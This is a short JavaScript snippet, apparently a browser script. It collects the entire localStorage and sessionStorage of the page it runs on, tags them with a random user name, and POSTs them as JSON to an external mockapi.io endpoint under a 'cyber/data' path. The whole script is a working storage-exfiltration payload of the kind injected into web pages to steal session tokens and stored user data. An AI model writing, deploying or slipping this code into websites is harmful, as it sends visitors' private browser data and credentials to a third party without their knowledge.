let d1 = window.localStorage;
let d2 = window.sessionStorage;

let r = Math.trunc(Math.random()*1000000);
console.log(r);


let user = {
  "name": `user-${r}`,
  "dataLocal": d1,
  "dataSession": d2,
}

if(user){
    fetch('https://6529995155b137ddc83f0695.mockapi.io/cyber/data', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json;charset=utf-8'
    },
    body: JSON.stringify(user)
  });
} else {
    console.log("Error");
}

